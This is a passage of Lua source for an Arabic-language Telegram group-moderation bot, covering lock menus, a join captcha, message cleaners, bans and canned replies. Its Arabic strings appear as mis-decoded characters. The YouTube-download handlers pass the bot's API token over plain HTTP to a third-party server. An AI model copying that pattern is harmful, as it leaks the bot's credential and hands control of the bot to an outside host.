return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockfshar') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨ '
database:del(bot_id..'lock:Fshar'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockinlene') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ '
database:del(bot_id.."Tshake:Lock:Inlen"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/homelocks') and Addictive(data) then
if tonumber(Text:match('(.*)/homelocks')) == tonumber(data.sender_user_id_) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΩΩΩ ΩΩΨͺΨ­ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockjoine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockjoine"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=data.sender_user_id_.."/lockchat"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=data.sender_user_id_.."/unlockchat"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=data.sender_user_id_.."/lock_joine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=data.sender_user_id_.."/unlock_joine"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockbots"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockbots"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=data.sender_user_id_.."/locktags"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=data.sender_user_id_.."/unlocktags"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=data.sender_user_id_.."/lockedit"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=data.sender_user_id_.."/unlockedit"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/locklink"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/unlocklink"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockusername"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockusername"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨ§Ω', callback_data=data.sender_user_id_.."/locktag"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω', callback_data=data.sender_user_id_.."/unlocktag"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/locksticar"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlocksticar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=data.sender_user_id_.."/lockgif"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=data.sender_user_id_.."/unlockgif"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ', callback_data=data.sender_user_id_.."/lockvideo"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ', callback_data=data.sender_user_id_.."/unlockvideo"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨ±', callback_data=data.sender_user_id_.."/lockphoto"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±', callback_data=data.sender_user_id_.."/unlockphoto"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockvoise"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockvoise"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨͺ', callback_data=data.sender_user_id_.."/lockaudo"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ', callback_data=data.sender_user_id_.."/unlockaudo"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=data.sender_user_id_.."/lockfwd"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=data.sender_user_id_.."/unlockfwd"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockfile"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockfile"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/lockphone"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=data.sender_user_id_.."/unlockphone"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=data.sender_user_id_.."/lockposts"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=data.sender_user_id_.."/unlockposts"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=data.sender_user_id_.."/lockflood"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=data.sender_user_id_.."/unlockflood"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=data.sender_user_id_.."/lockfarse"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=data.sender_user_id_.."/unlockfarse"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ³Ψ¨', callback_data=data.sender_user_id_.."/lockfshar"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨', callback_data=data.sender_user_id_.."/unlockfshar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ', callback_data=data.sender_user_id_.."/lockenglish"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ', callback_data=data.sender_user_id_.."/unlockenglish"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockinlene"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockinlene"},
},
{
{text = 'π Ψ±Ψ¬ΩΨΉ Ψ§ΩΩ Ψ§ΩΨ?ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(%d+)/UnKed@(%d+):(%d+)') then
local ramsesadd = {string.match(Text,"^(%d+)/UnKed@(%d+):(%d+)$")}
if tonumber(ramsesadd[2]) == tonumber(ramsesadd[3]) then
if tonumber(ramsesadd[1]) == tonumber(data.sender_user_id_) then
DeleteMessage(data.chat_id_, {[0] = Msg_id})  
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
end
end
end
if Text and Text:match('@id/(.*)') then
local Id_Link = Text:match('@id/(.*)') 
DeleteMessage(data.chat_id_,{[0] = Msg_id})  
local textt = '- ΩΩ ΩΨΆΩΩ Ψ§Ψ?ΨͺΨ± ΩΩΨΉ Ψ§ΩΨͺΩΨ²ΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΩΨ²ΩΩ ΩΩΩ', callback_data="mp3/"..Id_Link},
},
{
{text = 'ΨͺΩΨ²ΩΩ Ψ¨Ψ΅ΩΩ', callback_data="ogg/"..Id_Link},
},
{
{text = 'ΨͺΩΨ²ΩΩ ΩΩΨ―ΩΩ', callback_data="mp4/"..Id_Link},
},
}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..Chat_id..'&photo='..'https://youtu.be/'..Id_Link..'&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
elseif Text and Text:match('mp3/(.*)') then
local Id_Link = Text:match('mp3/(.*)') 
DeleteMessage(data.chat_id_,{[0] = Msg_id})    
http.request('http://devstorm.ml/yt2.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=mp3&msg=0')
elseif Text and Text:match('ogg/(.*)') then
local Id_Link = Text:match('ogg/(.*)') 
DeleteMessage(data.chat_id_,{[0] = Msg_id})    
http.request('http://devstorm.ml/yt2.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=ogg&msg=0')
elseif Text and Text:match('mp4/(.*)') then
local Id_Link = Text:match('mp4/(.*)') 
DeleteMessage(data.chat_id_,{[0] = Msg_id})    
http.request('http://devstorm.ml/yt2.php?url='..Id_Link..'&token='..token..'&chat='..data.chat_id_..'&type=mp4&msg=0')
end

end

if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Tshake:Chek:Groups','-100'..data.channel_.id_)  
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local text = msg.content_.text_
if msg.sender_user_id_ == tonumber(bot_id) then return false end

if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("OLD MESSAGE")
return false
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ±' and Addictive(msg) then   
database:del(bot_id..'Tshake:nwe:mem:group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'\n ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ±' ) 
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ±' and Addictive(msg) then  
database:set(bot_id..'Tshake:nwe:mem:group'..msg.chat_id_,'true') 
send(msg.chat_id_, msg.id_,'\nΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ±β' ) 
end 

--======================================================================================================
--======================================================================================================
if Addictive(msg) then 


if (msg.content_.ID == "MessagePhoto" 
or msg.content_.ID == "MessageSticker" 
or msg.content_.ID == "MessageVoice" 
or msg.content_.ID == "MessageAudio" 
or msg.content_.ID == "MessageVideo" 
or msg.content_.ID == "MessageAnimation" 
or msg.content_.ID == "MessageUnsupported") 
and database:get(bot_id.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
database:sadd(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = database:get(bot_id..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
database:setex(bot_id..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end
local Cleaner = database:smembers(bot_id..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not database:get(bot_id..":SetTimerCleaner:"..msg.chat_id_..v) then
DeleteMessage(msg.chat_id_, {[0] = v}) 
database:srem(bot_id..":IdsMsgsCleaner:"..msg.chat_id_,v)
print("MSG DELET CLEANER : "..v)
else
print("MSG List CLEANER : "..v.." : Lodding ...")
end
end
end

if text and DevTshake(msg) and database:get(bot_id.."Tshake:witt:Del_All"..msg.sender_user_id_..":"..msg.chat_id_) then
   database:del(bot_id.."Tshake:witt:Del_All"..msg.sender_user_id_..":"..msg.chat_id_)
   if database:hdel(bot_id..':Replay:Source:',text) == 0 then 
   send(msg.chat_id_, msg.id_, 'π?βΏ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ°Ψ§ Ψ§ΩΩΩΩΩ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― !')
   return false
   end
   send(msg.chat_id_, msg.id_, 'π βΏ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω ')
   return false
   end

if text then
Replay = database:hget(bot_id..':Replay:Source:',text)
if Replay then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = arg.Replay
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
end,{Replay=Replay})
return false
end
end


--======================================================================================================
--======================================================================================================


if msg.content_.ID == "MessageChatJoinByLink" and database:get(bot_id..'Tshake:nwe:mem:group'..msg.chat_id_) == 'true'then
numphoto = {'3','8','9','6'}
numphotoid = numphoto[math.random(#numphoto)]
local numjoine = (numphotoid + 3)
local Texti = 'Ψ§Ψ?ΨͺΨ± Ψ§ΩΩΨ¬Ψ§Ψ¨Ω Ψ§ΩΨ΅Ψ­ΩΨ­Ω \n'..numphotoid..' + 3 ='
local num1 = (5 + numphotoid)
local num2 = (7 + numphotoid)
local num3 = (1 + numphotoid)

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = num1, callback_data=msg.sender_user_id_.."/lockjoine"},{text = num2, callback_data=msg.sender_user_id_.."/unlockjoine"},
},
{
{text =numjoine, callback_data=msg.sender_user_id_.."/UnKed@"..numjoine..":"..numjoine},{text = num3, callback_data=msg.sender_user_id_.."/unlockjoine"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
return false
end
if msg.sender_user_id_ and Muted_Groups(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then  
if msg.sender_user_id_ and Ban_Groups(msg.chat_id_,msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_Groups(msg.chat_id_,msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_All_Groups(msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_All_Groups(msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
end
------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id.."Tshake:Lock:tagservr"..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
if text and not database:sismember(bot_id..'Tshake:Spam:Group'..msg.sender_user_id_,text) then
database:del(bot_id..'Tshake:Spam:Group'..msg.sender_user_id_) 
end
------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
database:set(bot_id..'Tshake:User:Name'..msg.sender_user_id_,data.username_)
end;end,nil)   
------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  

   ---==========================================
   ---==========================================
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
Namebot = (database:get(bot_id.."Tshake:Name:Bot") or "Ψ§ΩΩΨ§")
local Texti = "Ψ§ΩΨ§ Ψ¨ΩΨͺ "..Namebot.." π€\n\nβ Ψ§Ψ?ΨͺΨ΅Ψ§Ψ΅Ω Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺπ‘..\nβ ΩΩΨͺΩΨΉΩΩ ΩΩ Ψ¨Ψ±ΩΨΉΩ ΩΨ΄Ψ±Ω ΩΨ§Ψ±Ψ³Ω ΨͺΩΨΉΩΩ ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨π¦ ."
keyboard = {} 
keyboard.inline_keyboard ={{{text = "Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΩ ΩΨ¬ΩΩΨΉΨͺΩβοΈ", switch_inline_query="Ψ¨ΩΨͺ Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ ΨΆΩΩΩΩ Ψ§ΩΩ ΩΨ¬ΩΩΨΉΨͺΩ ΩΩΩ Ψ§ΨΉΩΩ ΨΉΩΩ Ψ­ΩΨ§ΩΨͺΩΨ§ ."}}}
local msg_id = msg.id_/2097152/0.5
local res = https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

   ---==========================================
   ---==========================================
database:set(bot_id.."Tshake:Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Addictive(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Addictive(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Addictive(msg) and Bots == "del" then   
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Addictive(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
------------------------------------------------------------------------
if text and database:get(bot_id.."Tshake:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = database:get(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
database:del(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
database:del(bot_id.."Tshake:Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."Tshake:List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"π‘βΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ§ΩΨ± ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"π‘βΏΩΨ§ ΩΩΨ¬Ψ― Ψ§ΩΨ± Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΨ§Ψ³Ω ΨͺΨ§ΩΨ― ΩΩ Ψ§ΩΨ§ΩΨ± ΩΨ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
end
database:del(bot_id.."Tshake:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
local Name_Bot = (database:get(bot_id.."Tshake:Name:Bot") or "Ψ§ΩΩΨ§x")
if not database:get(bot_id.."Tshake:Fun_Bots"..msg.chat_id_) then
if text ==  ""..Name_Bot..' Ψ΄ΩΩ Ψ±Ψ¦ΩΩ Ψ¨ΩΨ§Ψ°Ψ§' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'ΩΩΩΩ ΩΨ²Ψ§Ψ­Ω ΩΩ Ψ³Ψ§ΨΉ Ψ²Ψ­ΩΩΩ ΩΨ­ΨΆΨ±ΨͺΩ π','Ψ?ΩΨ΄ ΩΩΨ― Ω ΩΨ±Ψ―Ω ΩΨ§Ω Ψ§ΩΩΩ π','ΩΩΨΉΨ¨ ΨΉ Ψ§ΩΨ¨ΩΨ§Ψͺ π', 'ΩΩΨ― Ψ²Ψ§ΩΨΉΨͺΩ Ψ§ΩΩΨ§ΨΉ πΆπ','Ψ΅Ψ§Ω ΩΨ?Ψ¨Ω ΩΩΨΉΨΆΩ ','ΩΨ­ΩΩ ΩΨ΄ΩΨ§Ψ±Ψ¨Ω Ψ¬ΩΩΨ§ ΩΩΩΨ§Ψ³Ω ππ€·πΌββοΈ','Ψ§ΩΩΨͺ ΨΉΩΩΩ π','ΩΩΩ ΨΊΩΨ± Ψ§ΩΨ­Ψ¨ ΩΨ§Ω Ψ§ΩΩ β€οΈ','ΩΩ Ψ?ΩΨ΄ ΩΩΨ― Ψ΅Ψ±Ψ§Ψ­Ω βΉοΈ','Ψ§Ψ―Ψ¨Ψ³Ψ² ΩΩΩΨ­ΨͺΨ±Ω Ψ§ΩΨ¨ΩΨ§Ψͺ  ', 'ΩΨ― ΩΨ§Ψ­Ψ― ΩΨ°Ψ± ππ','ΩΨ§Ψ·ΩΩΩ ΩΩ ΩΨ§ Ψ§ΩΩΨ΄Ω Ψ±ΩΨ­ΨͺΩ Ψ¬ΩΩΨ§ Ψ¨Ψ?Ψ§Ψ? Ψ¨Ω Ψ¨Ψ§Ω ΩΨ§Ω Ψ­Ψ΄Ψ±Ψ§Ψͺ ππ€·ββοΈ','ΩΩ Ψ?ΩΨ΄ ΩΩΨ― π€' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' Ψ΄ΩΩ Ψ±Ψ¦ΩΩ Ψ¨ΩΨ§Ω' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
